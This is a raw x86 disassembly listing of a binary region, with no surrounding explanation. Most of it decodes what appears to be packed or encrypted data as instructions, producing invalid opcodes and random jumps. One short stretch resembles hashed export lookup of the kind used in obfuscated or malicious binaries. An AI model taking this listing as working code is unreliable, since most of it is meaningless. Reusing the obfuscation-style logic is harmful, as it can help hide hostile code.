  41a13f:	sar    BYTE PTR [ebp+ebx*1+0x63],0xd1
  41a144:	std    
  41a145:	jbe    0x41a114
  41a147:	sub    eax,0xcb3807bb
  41a14c:	push   es
  41a14d:	loopne 0x41a105
  41a14f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a151:	ret    0xd16c
  41a154:	and    BYTE PTR [ecx],al
  41a156:	inc    edx
  41a157:	repnz sub edi,0xf25ac757
  41a15e:	sbb    al,0xb1
  41a160:	mov    edx,0x71d69ad5
  41a165:	pop    ebx
  41a166:	mov    ecx,DWORD PTR fs:[esi+ebp*8]
  41a16a:	push   cs
  41a16b:	push   0x7e75319a
  41a170:	hlt    
  41a171:	and    bl,BYTE PTR [edi+eax*4+0x254f60]
  41a178:	inc    ecx
  41a179:	outs   dx,DWORD PTR ds:[esi]
  41a17a:	and    BYTE PTR [ecx],ch
  41a17c:	daa    
  41a17d:	push   ebx
  41a17e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a17f:	mov    cl,0xb3
  41a181:	or     al,0x45
  41a183:	jmp    0x842c4c62
  41a188:	push   cs
  41a189:	lds    esi,FWORD PTR [eax]
  41a18b:	or     ah,BYTE PTR [ebx+0x5d]
  41a18e:	cmc    
  41a18f:	mov    ebp,0x28514c84
  41a194:	xchg   esp,eax
  41a195:	out    0x2b,eax
  41a197:	sar    BYTE PTR [ebx],1
  41a199:	pop    ebx
  41a19a:	rcr    BYTE PTR [ebp+0x4],cl
  41a19d:	and    ch,BYTE PTR [edi+0x6e]
  41a1a0:	xor    esp,esi
  41a1a2:	adc    DWORD PTR [esi+0x1],ebx
  41a1a5:	call   FWORD PTR [eax-0x50e21b33]
  41a1ab:	push   ds
  41a1ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1ad:	cmc    
  41a1ae:	jmp    0x41a19e
  41a1b0:	out    0xf9,al
  41a1b2:	in     al,dx
  41a1b3:	fistp  DWORD PTR [ebx+0x2659a402]
  41a1b9:	fchs   
  41a1bb:	pop    eax
  41a1bc:	mov    al,ds:0x790004ae
  41a1c1:	(bad)  
  41a1c3:	data16 adc al,0x9
  41a1c6:	jp     0x41a214
  41a1c8:	cmp    ecx,ebp
  41a1ca:	mov    bh,0xf4
  41a1cc:	inc    esp
  41a1cd:	mov    bh,BYTE PTR [ebx+0x33]
  41a1d0:	adc    DWORD PTR [ebp+ebp*2+0x744b9213],esp
  41a1d7:	pop    esp
  41a1d8:	sahf   
  41a1d9:	les    esi,FWORD PTR ds:0xd89f9f99
  41a1df:	rsqrtps xmm2,XMMWORD PTR [esi]
  41a1e2:	in     eax,dx
  41a1e3:	call   0xe304c843
  41a1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1e9:	pop    ebx
  41a1ea:	adc    eax,0xe2fa4e65
  41a1ef:	gs pop ebx
  41a1f1:	dec    edi
  41a1f2:	sub    al,BYTE PTR [ebx+0x65]
  41a1f5:	inc    edx
  41a1f6:	or     dh,0xb0
  41a1f9:	(bad)  
  41a1fa:	ins    DWORD PTR es:[edi],dx
  41a1fb:	dec    edi
  41a1fc:	xchg   edi,eax
  41a1fd:	sbb    ecx,0x5d
  41a200:	mov    edx,0x2397b286
  41a205:	pop    ebx
  41a206:	sbb    DWORD PTR [edi+ecx*2-0x6b6a31d0],eax
  41a20d:	cmp    al,0x1a
  41a20f:	or     BYTE PTR [edx-0x68],ch
  41a212:	cmp    esi,ebp
  41a214:	push   0x91dc28ce
  41a219:	out    0x34,eax
  41a21b:	and    eax,0xc4dbb715
  41a220:	rep ins WORD PTR es:[edi],dx
  41a223:	push   esp
  41a224:	je     0x41a29d
  41a226:	cli    
  41a227:	push   ds
  41a228:	imul   edi,DWORD PTR [ebx],0xffffffb7
  41a22b:	cmp    BYTE PTR [eax],0xb
  41a22e:	iret   
  41a22f:	inc    edx
  41a230:	cs cmovp esp,DWORD PTR cs:[eax+0x7]
  41a236:	rcr    DWORD PTR [esi],1
  41a238:	das    
  41a239:	xchg   BYTE PTR [ebx+0x7f],ah
  41a23c:	adc    BYTE PTR [ecx],al
  41a23e:	dec    edx
  41a23f:	pusha  
  41a240:	sbb    ah,BYTE PTR [ebp+0x7e]
  41a243:	cmp    DWORD PTR ds:0x3edba941,ebx
  41a249:	lods   al,BYTE PTR ds:[esi]
  41a24a:	sub    cl,bh
  41a24c:	fistp  QWORD PTR [eax+ecx*4-0x3a]
  41a250:	jb     0x41a223
  41a252:	fndisi(8087 only) 
  41a254:	mov    eax,ds:0xb5c57849
  41a259:	jb     0x41a286
  41a25b:	les    ebx,FWORD PTR ds:0x16e53bf2
  41a261:	xchg   ecx,eax
  41a262:	or     edi,esp
  41a264:	daa    
  41a265:	stc    
  41a266:	test   BYTE PTR [edx+0x16],0x50
  41a26a:	retf   0x2dbb
  41a26d:	xchg   ebx,eax
  41a26e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a26f:	mov    ch,0xe3
  41a271:	test   BYTE PTR [edx+0x2eec75dc],0x86
  41a278:	pop    ebp
  41a279:	xor    BYTE PTR ds:0x9f419e0e,0x9f
  41a280:	inc    ecx
  41a281:	sbb    esi,DWORD PTR [esi-0x66]
  41a284:	add    dh,BYTE PTR [edx]
  41a286:	popa   
  41a287:	jb     0x41a2f7
  41a289:	clc    
  41a28a:	dec    esi
  41a28b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a28c:	fbld   TBYTE PTR [ecx+0x5e]
  41a28f:	jb     0x41a267
  41a291:	jge    0x41a2a6
  41a293:	cmp    BYTE PTR [eax],ah
  41a295:	and    esi,DWORD PTR [eax+0x7b2e6c91]
  41a29b:	jge    0x41a264
  41a29d:	sar    DWORD PTR ds:0xa820b320,1
  41a2a3:	sti    
  41a2a4:	sbb    eax,0x5a88038c
  41a2a9:	lods   al,BYTE PTR cs:[esi]
  41a2ab:	xchg   edi,eax
  41a2ac:	jle    0x41a297
  41a2ae:	add    al,0x56
  41a2b0:	cmp    DWORD PTR [esi],0xffffff92
  41a2b3:	repnz adc DWORD PTR [ebx+ebp*8],ecx
  41a2b7:	mov    ebp,0x3170a845
  41a2bc:	sub    eax,0xe6942c6c
  41a2c1:	mov    ch,BYTE PTR [ebp+0x5c]
  41a2c4:	xchg   BYTE PTR [eax-0x14360bd9],bl
  41a2ca:	loop   0x41a325
  41a2cc:	int3   
  41a2cd:	jecxz  0x41a25b
  41a2cf:	stos   DWORD PTR es:[edi],eax
  41a2d0:	pop    ebp
  41a2d1:	stos   DWORD PTR es:[edi],eax
  41a2d2:	aaa    
  41a2d3:	inc    ebx
  41a2d4:	addr16 sbb al,0x56
  41a2d7:	xor    eax,0x6cd3903f
  41a2dc:	jecxz  0x41a2a6
  41a2de:	(bad)  
  41a2df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2e0:	les    esp,FWORD PTR [ebp-0x20]
  41a2e3:	mov    ds:0xfac4c3cf,eax
  41a2e8:	repz std 
  41a2ea:	or     BYTE PTR [edi],bl
  41a2ec:	das    
  41a2ed:	fwait
  41a2ee:	inc    edi
  41a2ef:	sbb    al,BYTE PTR [ebp+0x5a]
  41a2f2:	add    DWORD PTR [edx-0x7152cff6],ecx
  41a2f8:	fwait
  41a2f9:	adc    al,0x6a
  41a2fb:	or     al,0xaa
  41a2fd:	sub    esp,ebx
  41a2ff:	out    0xf6,eax
  41a301:	in     eax,0x8e
  41a303:	aas    
  41a304:	sub    BYTE PTR [edi],bl
  41a306:	fsincos 
  41a308:	loopne 0x41a2e9
  41a30a:	test   BYTE PTR [ecx-0xb],cl
  41a30d:	test   BYTE PTR [edi-0x18],al
  41a310:	and    DWORD PTR cs:[ecx+0x4a],ebp
  41a314:	div    BYTE PTR [edi+edx*8]
  41a317:	xor    BYTE PTR ds:0x13695954,bl
  41a31d:	sub    esi,DWORD PTR [eax-0x45]
  41a320:	ss ins DWORD PTR es:[edi],dx
  41a322:	cld    
  41a323:	pusha  
  41a324:	mov    WORD PTR [ebp+0x53],cs
  41a327:	dec    ebp
  41a328:	loopne 0x41a329
  41a32a:	call   ecx
  41a32c:	rol    DWORD PTR [ebp-0xed1f813],cl
  41a332:	popa   
  41a333:	mov    BYTE PTR [edx-0x4de66d9a],bl
  41a339:	sti    
  41a33a:	adc    dh,BYTE PTR [eax-0x59bdecda]
  41a340:	data16 jo 0x41a2d2
  41a343:	dec    edi
  41a344:	inc    ebp
  41a345:	mov    eax,0x95352870
  41a34a:	aaa    
  41a34b:	pop    ebp
  41a34c:	jmp    FWORD PTR [esi-0x2f67b88f]
  41a352:	ins    BYTE PTR es:[edi],dx
  41a353:	sbb    al,0xe
  41a355:	inc    esp
  41a356:	stc    
  41a357:	jle    0x41a394
  41a359:	sub    BYTE PTR [edx-0x4e],dl
  41a35c:	test   al,0x60
  41a35e:	pop    edi
  41a35f:	ins    DWORD PTR es:[edi],dx
  41a360:	test   DWORD PTR [ebx-0x6eed1dd8],0x3a13072c
  41a36a:	out    dx,al
  41a36b:	ja     0x41a3c6
  41a36d:	test   DWORD PTR [edx-0x480ca2c8],ecx
  41a373:	lea    eax,[eax+0x4cf082bf]
  41a379:	imul   ebp,eax,0xfffffffd
  41a37c:	push   ss
  41a37d:	adc    al,0x10
  41a37f:	mov    ebp,0x63f5e65f
  41a384:	jns    0x41a324
  41a386:	sbb    eax,0xcef45cae
  41a38b:	retf   0xbfec
  41a38e:	icebp  
  41a38f:	and    ecx,esi
  41a391:	fadd   QWORD PTR [ebp-0x58a6d053]
  41a397:	and    BYTE PTR [ebp+edi*2-0x3fc31e3e],bh
  41a39e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a39f:	push   esp
  41a3a0:	jno    0x41a409
  41a3a2:	push   es
  41a3a3:	leave  
  41a3a4:	inc    esp
  41a3a5:	cmp    bh,BYTE PTR [eax]
  41a3a7:	or     esi,esp
  41a3a9:	fucom  st(1)
  41a3ab:	dec    esp
  41a3ac:	pop    edx
  41a3ad:	pop    esi
  41a3ae:	dec    ecx
  41a3af:	in     eax,dx
  41a3b0:	dec    DWORD PTR [ebp+0x7c]
  41a3b3:	scas   al,BYTE PTR es:[edi]
  41a3b4:	xor    ebp,DWORD PTR [ebx-0x1de60756]
  41a3ba:	(bad)  
  41a3bb:	jecxz  0x41a3d1
  41a3bd:	adc    BYTE PTR [ebp+0x672798e0],dh
  41a3c3:	fdivr  DWORD PTR [ecx]
  41a3c5:	sbb    edi,0xa16429e9
  41a3cb:	mov    DWORD PTR [edi],0xfdec4a8
  41a3d1:	js     0x41a3b1
  41a3d3:	sbb    eax,0xb3385a3c
  41a3d8:	(bad)  
  41a3d9:	mov    edx,0x4ef26773
  41a3de:	jbe    0x41a3fc
  41a3e0:	jmp    0x41a3cb
  41a3e2:	test   BYTE PTR [ebx+ecx*8+0x48c1fa97],0xe3
  41a3ea:	neg    DWORD PTR [esi+0xc]
  41a3ed:	mov    dl,0x8e
  41a3ef:	jecxz  0x41a3ac
  41a3f1:	sub    ah,ah
  41a3f3:	(bad)  
  41a3f4:	mov    bl,0x80
  41a3f6:	test   bl,dl
  41a3f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3f9:	inc    ebp
  41a3fa:	out    dx,eax
  41a3fb:	mov    dl,0x0
  41a3fd:	xor    bl,dh
  41a3ff:	mov    ebx,0xcac896a8
  41a404:	ins    BYTE PTR es:[edi],dx
  41a405:	out    dx,al
  41a406:	and    eax,0x1b5382d8
  41a40b:	pop    ebx
  41a40c:	dec    esi
  41a40d:	cmp    dl,0x62
  41a410:	xor    DWORD PTR [ecx],ecx
  41a412:	and    BYTE PTR ds:0x53926745,bl
  41a418:	mov    ds:0x99f13dbb,eax
  41a41d:	sub    eax,ecx
  41a41f:	mov    bl,0xa2
  41a421:	push   ds
  41a422:	mov    BYTE PTR [edx-0x23f7680c],ah
  41a428:	jo     0x41a47f
  41a42a:	outs   dx,DWORD PTR ds:[esi]
  41a42b:	int3   
  41a42c:	mov    esp,0xf3224c11
  41a431:	les    ebp,FWORD PTR [ebx+0x6b439a2c]
  41a437:	xlat   BYTE PTR ds:[ebx]
  41a438:	shl    BYTE PTR [edi+0x9],cl
  41a43b:	jmp    0xd36b:0x9a1ce8c0
  41a442:	dec    edx
  41a443:	add    BYTE PTR ds:0x48854157,al
  41a449:	inc    edx
  41a44a:	test   eax,0x5c3764f9
  41a44f:	imul   esi,DWORD PTR [ebx],0x4cb904ff
  41a455:	xor    ch,dl
  41a457:	and    al,BYTE PTR [edx-0x159c3d56]
  41a45d:	cld    
  41a45e:	(bad)  
  41a45f:	xlat   BYTE PTR ds:[ebx]
  41a460:	(bad)  
  41a461:	popf   
  41a462:	sbb    DWORD PTR [ecx-0x4c27749c],0x2eebdba6
  41a46c:	cld    
  41a46d:	icebp  
  41a46e:	push   ebx
  41a46f:	xchg   esi,eax
  41a470:	and    ch,dl
  41a472:	jg     0x41a411
  41a474:	adc    eax,0xd96151a6
  41a479:	or     eax,0xd8fc63e9
  41a47e:	sub    cl,BYTE PTR [eax]
  41a480:	xor    BYTE PTR [edx-0x6ac2c229],ah
  41a486:	and    dh,al
  41a488:	(bad)  
  41a489:	adc    eax,DWORD PTR [ecx+ebp*1]
  41a48c:	adc    bl,BYTE PTR ds:0xd8a87e51
  41a492:	imul   edx,DWORD PTR [eax-0x25],0x20
  41a496:	in     al,0xee
  41a498:	(bad)  
  41a499:	pusha  
  41a49a:	and    eax,0x17835637
  41a49f:	int    0xd6
  41a4a1:	and    DWORD PTR [ebx-0x22],ebx
  41a4a4:	dec    esp
  41a4a5:	icebp  
  41a4a6:	or     DWORD PTR [ebp+0x68902aa6],ecx
  41a4ac:	sub    eax,0x1d6936e4
  41a4b1:	inc    esi
  41a4b2:	data16 std 
  41a4b4:	xor    esi,edx
  41a4b6:	add    eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8+0x753b74ab]
  41a500:	add    BYTE PTR [eax+0x0],cl
  41a503:	popa   
  41a504:	(bad)  
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx-0x1f]
  41a50a:	aaa    
  41a50b:	sbb    eax,0x6339b437
  41a510:	dec    esp
  41a511:	out    0x48,al
  41a513:	(bad)  
  41a514:	cli    
  41a515:	mov    cl,0x44
  41a517:	stos   BYTE PTR es:[edi],al
  41a518:	in     eax,0x1c
  41a51a:	(bad)  
  41a51b:	dec    edx
  41a51c:	popf   
  41a51d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a51e:	hlt    
  41a51f:	push   ds
  41a520:	repz lds ebp,FWORD PTR [edi+edi*1-0x2b]
  41a525:	shl    DWORD PTR [edi+0x465ebdbd],0x2c
  41a52c:	mov    al,BYTE PTR [ebp+0x4f93ac5]
  41a532:	pushf  
  41a533:	ret    0x521c
  41a536:	pop    eax
  41a537:	addr16 lahf 
  41a539:	push   ebp
  41a53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a53b:	sub    eax,0x9eed07bf
  41a540:	mul    DWORD PTR [ecx]
  41a542:	pop    ss
  41a543:	mov    edx,0xbab95b91
  41a548:	cdq    
  41a549:	mov    bh,0x7f
  41a54b:	(bad)
  41a54e:	add    al,0xe6
  41a550:	dec    BYTE PTR [edi-0x38beed69]
  41a556:	push   eax
  41a557:	das    
  41a558:	push   eax
  41a559:	jp     0x41a4e2
  41a55b:	pusha  
  41a55c:	xchg   edi,eax
  41a55d:	mov    dl,BYTE PTR [esi-0x6340ff1c]
  41a563:	sar    BYTE PTR [esp+ebx*4+0x5b],0x8
  41a568:	pop    ecx
  41a569:	xor    eax,0x116afa0c
  41a56e:	push   ebp
  41a56f:	cmp    ecx,DWORD PTR ds:0x5cb17517
  41a575:	leave  
  41a576:	cmp    eax,0x57bf2928
  41a57b:	cmp    eax,0x6f0e0247
  41a580:	imul   eax,DWORD PTR [edi],0x775699eb
  41a586:	mov    bh,0x2
  41a588:	popf   
  41a589:	call   0xfdf0:0x5c1e6ec3
  41a590:	js     0x41a5aa
  41a592:	into   
  41a593:	lods   eax,DWORD PTR ds:[esi]
  41a594:	dec    ebp
  41a595:	inc    edx
  41a596:	int    0xac
  41a598:	or     ecx,DWORD PTR [ebp+eax*4+0x2b]
  41a59c:	xchg   esp,eax
  41a59d:	cmp    ebx,DWORD PTR [edi]
  41a59f:	sahf   
  41a5a0:	imul   ecx,DWORD PTR [eax+edi*8+0x2dc2cf20],0x87142b67
  41a5ab:	mov    bh,0x8f
  41a5ad:	out    0x87,al
  41a5af:	dec    edx
  41a5b0:	stc    
  41a5b1:	jp     0x41a626
  41a5b3:	push   0x8b0028b8
  41a5b8:	xchg   edi,eax
  41a5b9:	ja     0x41a54d
  41a5bb:	test   BYTE PTR cs:[edx+0x79],al
  41a5bf:	aam    0x4c
  41a5c1:	icebp  
  41a5c2:	mov    al,ds:0x79bd455d
  41a5c7:	ret    
  41a5c8:	das    
  41a5c9:	jle    0x41a594
  41a5cb:	sahf   
  41a5cc:	sahf   
  41a5cd:	nop
  41a5ce:	push   edx
  41a5cf:	sar    BYTE PTR [edi+0x7e0d3c7c],cl
  41a5d5:	xor    cl,bh
  41a5d7:	es xor al,0xdc
  41a5da:	ror    BYTE PTR [esi],0x9c
  41a5dd:	cs ja  0x41a5fa
  41a5e0:	shl    DWORD PTR [ecx+eiz*1-0x7d],1
  41a5e4:	sbb    BYTE PTR [eax-0x6a],dl
  41a5e7:	cs imul esp,eax,0x49
  41a5eb:	mov    bl,0x4b
  41a5ed:	cmp    al,0xd2
  41a5ef:	nop
  41a5f0:	fwait
  41a5f1:	and    al,0xcf
  41a5f3:	daa    
  41a5f4:	repnz mov dl,0x99
  41a5f7:	sbb    ebp,0x3d
  41a5fa:	pop    ebp
  41a5fb:	mov    BYTE PTR [ecx],al
  41a5fd:	push   es
  41a5fe:	arpl   WORD PTR cs:[ecx],di
  41a601:	retf   0x8667
  41a604:	into   
  41a605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a606:	xbegin 0x9f069c8
  41a60c:	sbb    ch,ah
  41a60e:	jecxz  0x41a61f
  41a610:	std    
  41a611:	cmp    BYTE PTR [esi+0x12],al
  41a614:	and    BYTE PTR [edi-0x385eb74c],ah
  41a61a:	mov    dh,BYTE PTR [ebp+0x37]
  41a61d:	sub    al,0x17
  41a61f:	mov    dh,0xe6
  41a621:	cmc    
  41a622:	inc    edi
  41a623:	jg     0x41a5f2
  41a625:	outs   dx,BYTE PTR ds:[esi]
  41a626:	mov    gs,ecx
  41a628:	jp     0x41a5d8
  41a62a:	pop    edi
  41a62b:	gs lahf 
  41a62d:	push   es
  41a62e:	iret   
  41a62f:	(bad)  
  41a630:	jmp    FWORD PTR [edx+eiz*2-0x7d3f48c7]
  41a637:	xchg   DWORD PTR [ebp+0x3a],edx
  41a63a:	rol    DWORD PTR [ecx-0x69a6d921],1
  41a640:	or     ch,BYTE PTR [esi+0x3b9f28ca]
  41a646:	mov    cs,WORD PTR [eax+0x36aa3645]
  41a64c:	add    ah,ch
  41a64e:	lds    edx,FWORD PTR [ebx-0x16]
  41a651:	inc    eax
  41a652:	dec    edi
  41a653:	fdiv   QWORD PTR [esi+0x2f356f9b]
  41a659:	leave  
  41a65a:	jecxz  0x41a695
  41a65c:	stos   BYTE PTR es:[edi],al
  41a65d:	push   edx
  41a65e:	mov    al,ds:0x8f3f1963
  41a663:	repz mov esi,0x9577888a
  41a669:	fidivr WORD PTR [ebx]
  41a66b:	mov    DWORD PTR [edx-0x1b5b7d87],edx
  41a671:	mov    al,0xa4
  41a673:	(bad)  
  41a674:	in     al,dx
  41a675:	mov    esi,0x797fb937
  41a67a:	mov    ebx,0x8a4f8d7a
  41a67f:	push   esp
  41a680:	dec    edx
  41a681:	cmp    BYTE PTR [ebp+0x5d],dl
  41a684:	(bad)  [ebx+0x5c]
  41a687:	push   eax
  41a688:	in     al,dx
  41a689:	mov    bh,0x1b
  41a68b:	add    bl,dl
  41a68d:	inc    ecx
  41a68e:	push   es
  41a68f:	pushf  
  41a690:	sub    al,0xbe
  41a692:	int3   
  41a693:	mov    cs:0xd929997c,al
  41a699:	(bad)  
  41a69a:	in     eax,dx
  41a69b:	aas    
  41a69c:	cdq    
  41a69d:	sub    al,dh
  41a69f:	call   0x80a:0x2b88f20e
  41a6a6:	loopne 0x41a6ad
  41a6a8:	daa    
  41a6a9:	ret    
  41a6aa:	jmp    0x48b4490
  41a6af:	xchg   edx,eax
  41a6b0:	(bad)  
  41a6b1:	sbb    DWORD PTR [esi],esp
  41a6b3:	mov    dh,0xa4
  41a6b5:	retf   
  41a6b6:	retf   0xf166
  41a6b9:	stc    
  41a6ba:	xor    BYTE PTR [eax-0x6a],cl
  41a6bd:	jge    0x41a69c
  41a6bf:	frstor [esp+0x1]
  41a6c3:	mov    eax,DWORD PTR [esi-0x6e]
  41a6c6:	cmp    bh,BYTE PTR [ebx+edi*4+0x3843f69f]
  41a6cd:	pusha  
  41a6ce:	shl    BYTE PTR [esi-0x3dc482df],cl
  41a6d4:	(bad)  
  41a6d5:	ror    cl,1
  41a6d7:	jp     0x41a67b
  41a6d9:	enter  0xfc31,0x21
  41a6dd:	xor    al,0x42
  41a6df:	mov    esp,0x4ab36a87
  41a6e4:	cmp    edi,DWORD PTR [ebx-0x1b610849]
  41a6ea:	repnz push ss
  41a6ec:	jae    0x41a72c
  41a6ee:	popf   
  41a6ef:	cmp    esi,esp
  41a6f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6f2:	jno    0x41a757
  41a6f4:	mov    ecx,0x4c47b025
  41a6f9:	push   ds
  41a6fa:	mov    al,0xa
  41a6fc:	stos   DWORD PTR es:[edi],eax
  41a6fd:	dec    ebx
  41a6fe:	imul   edi,esi,0x41
  41a701:	mov    eax,ds:0x84c56a34
  41a706:	xor    edx,DWORD PTR [esi+eiz*4-0x56]
  41a70a:	out    0x46,al
  41a70c:	pop    ebp
  41a70d:	or     al,0xf6
  41a70f:	sbb    ch,BYTE PTR [ebp+0x28ccf381]
  41a715:	xor    bl,BYTE PTR [esi+0x4d53e28e]
  41a71b:	mov    edx,ecx
  41a71d:	mov    ah,0xa8
  41a71f:	xchg   DWORD PTR ds:0xff6b3dc5,esi
  41a725:	gs popf 
  41a727:	je     0x41a73b
  41a729:	fwait
  41a72a:	dec    DWORD PTR [esi]
  41a72c:	lds    edx,FWORD PTR [ebx+0x5669762a]
  41a732:	aaa    
  41a733:	shr    DWORD PTR [ebp-0x1f],0xe9
  41a737:	sbb    ebp,DWORD PTR [esi-0xc]
  41a73a:	pop    ss
  41a73b:	rol    ah,1
  41a73d:	sti    
  41a73e:	ja     0x41a6db
  41a740:	stc    
  41a741:	mov    ds:0xb0ed10df,eax
  41a746:	adc    DWORD PTR [ebx],ebp
  41a748:	int    0xcf
  41a74a:	jle    0x41a717
  41a74c:	loope  0x41a7ac
  41a74e:	push   DWORD PTR [eax]
  41a750:	jg     0x41a6d2
  41a752:	or     DWORD PTR [esp+edi*2+0x53],eax
  41a756:	mul    DWORD PTR [edi+0x388ab523]
  41a75c:	inc    esp
  41a75d:	inc    edx
  41a75e:	mov    bl,0x96
  41a760:	fdiv   st,st(6)
  41a762:	stc    
  41a763:	adc    BYTE PTR [ecx],bl
  41a765:	out    dx,eax
  41a766:	sbb    al,0xbf
  41a768:	pusha  
  41a769:	push   eax
  41a76a:	or     DWORD PTR ds:0x311aa70a,ebx
  41a770:	bound  esp,QWORD PTR [edx-0x59]
  41a773:	std    
  41a774:	and    eax,DWORD PTR [ecx]
  41a776:	(bad)  [eax+esi*4-0x30]
  41a77a:	dec    ecx
  41a77b:	loop   0x41a7e0
  41a77d:	(bad)  
  41a77e:	lds    edx,FWORD PTR [ebx+0x455a8733]
  41a784:	(bad)  
  41a785:	faddp  st(7),st
  41a787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a788:	add    DWORD PTR ds:0xb8efcc93,0x5a6721df
  41a792:	adc    DWORD PTR [edi],0x8b3fc9d6
  41a798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a799:	mov    ds:0x3bbc9b63,eax
  41a79e:	sbb    BYTE PTR ds:0xad9dd757,ch
  41a7a4:	xchg   edi,eax
  41a7a5:	sbb    BYTE PTR [eax],0xbe
  41a7a8:	std    
  41a7a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7aa:	and    DWORD PTR [edi],esp
  41a7ac:	into   
  41a7ad:	sub    ebp,esp
  41a7af:	and    ebp,DWORD PTR [eax]
  41a7b1:	adc    al,0x7a
  41a7b3:	or     DWORD PTR [eax-0x28],edi
  41a7b6:	in     al,0x56
  41a7b8:	in     eax,dx
  41a7b9:	pcmpeqd mm6,QWORD PTR [esi+0x2e212e1f]
  41a7c0:	lods   eax,DWORD PTR ds:[esi]
  41a7c1:	mov    bh,BYTE PTR [esi]
  41a7c3:	xchg   esi,eax
  41a7c4:	ret    
  41a7c5:	pop    esi
  41a7c6:	test   al,0xad
  41a7c8:	adc    al,0x9e
  41a7ca:	add    BYTE PTR [edx],al
  41a7cc:	adc    al,0x49
  41a7ce:	aad    0xf0
  41a7d0:	and    ebx,DWORD PTR [eax+0x8b99114]
  41a7d6:	stos   DWORD PTR es:[edi],eax
  41a7d7:	div    dh
  41a7d9:	(bad)  
  41a7da:	sbb    al,0x62
  41a7dc:	push   0x26
  41a7de:	gs dec edi
  41a7e0:	or     cl,BYTE PTR [ebp-0x1efc3247]
  41a7e6:	mov    bh,0xbd
  41a7e8:	lock (bad) 
  41a7ea:	repz mov eax,ds:0x3a956880
  41a7f0:	push   cs
  41a7f1:	sar    BYTE PTR [edx+0x5e],0xe8
  41a7f5:	lea    esp,[eax]
  41a7f7:	sub    esp,DWORD PTR [ebx-0x7d]
  41a7fa:	sbb    BYTE PTR [edi],bh
  41a7fc:	xor    ah,BYTE PTR [ecx-0x7838e387]
  41a802:	inc    eax
  41a803:	inc    eax
  41a804:	sbb    ah,BYTE PTR [ecx+eax*8-0x4f]
  41a808:	or     eax,0xef6ebe19
  41a80d:	push   edi
  41a80e:	xor    ebx,DWORD PTR [ecx-0x46]
  41a811:	rcl    eax,1
  41a813:	xchg   DWORD PTR [ebx+0x3d4d960c],esp
  41a819:	test   DWORD PTR [ebx-0x7b6f6ef3],eax
  41a81f:	nop
  41a820:	or     esp,DWORD PTR [eax]
  41a822:	jo     0x41a865
  41a824:	std    
  41a825:	mov    DWORD PTR [esi],ebx
  41a827:	cmp    eax,0x3333d837
  41a82c:	stos   WORD PTR es:[edi],ax
  41a82e:	gs js  0x41a876
  41a831:	add    al,0x98
  41a833:	sbb    ch,ch
  41a835:	(bad)  
  41a836:	stc    
  41a837:	mov    ebp,0x3cf27d97
  41a83c:	fisttp QWORD PTR [ebx+ecx*1]
  41a83f:	call   0x784c:0x68fe396a
  41a846:	xchg   esi,eax
  41a847:	adc    al,0xd9
  41a849:	rol    esi,1
  41a84b:	inc    DWORD PTR [ebx]
  41a84d:	imul   edi,DWORD PTR [esi+0x564a81b7],0x3b9d040d
  41a857:	push   es
  41a858:	jl     0x41a82e
  41a85a:	push   ds
  41a85b:	adc    bh,cl
  41a85d:	pusha  
  41a85e:	fucompp 
  41a860:	fist   DWORD PTR [ebx]
  41a862:	mov    ds:0x4b996f4d,al
  41a867:	nop
  41a868:	xor    BYTE PTR [edi],0xde
  41a86b:	mov    ?,WORD PTR [edi+edx*2]
  41a86e:	out    dx,al
  41a86f:	enter  0xcd18,0xc
  41a873:	out    dx,al
  41a874:	push   esi
  41a875:	arpl   di,si
  41a877:	and    ah,BYTE PTR [edx]
  41a879:	push   0x54
  41a87b:	pusha  
  41a87c:	pusha  
  41a87d:	or     esp,ebp
  41a87f:	ja     0x41a8c6
  41a881:	fwait
  41a882:	adc    al,0x0
  41a884:	mov    ah,0x87
  41a886:	mov    ah,0xb4
  41a888:	xor    DWORD PTR [ebp-0x50],ebp
  41a88b:	mov    esi,0xcf10fba4
  41a890:	aad    0x20
  41a892:	mov    ss,WORD PTR [ebx-0x73]
  41a895:	push   ebp
  41a896:	fwait
  41a897:	pop    ebx
  41a898:	loop   0x41a8ae
  41a89a:	(bad)  
  41a89b:	pop    ecx
  41a89c:	inc    edi
  41a89d:	cdq    
  41a89e:	imul   ebx,edx,0x6a
  41a8a1:	in     al,dx
  41a8a2:	xchg   DWORD PTR [eax],esi
  41a8a4:	bswap  esi
  41a8a6:	fnsave [esi-0x2974fcdd]
  41a8ac:	jle    0x41a908
  41a8ae:	pop    ebp
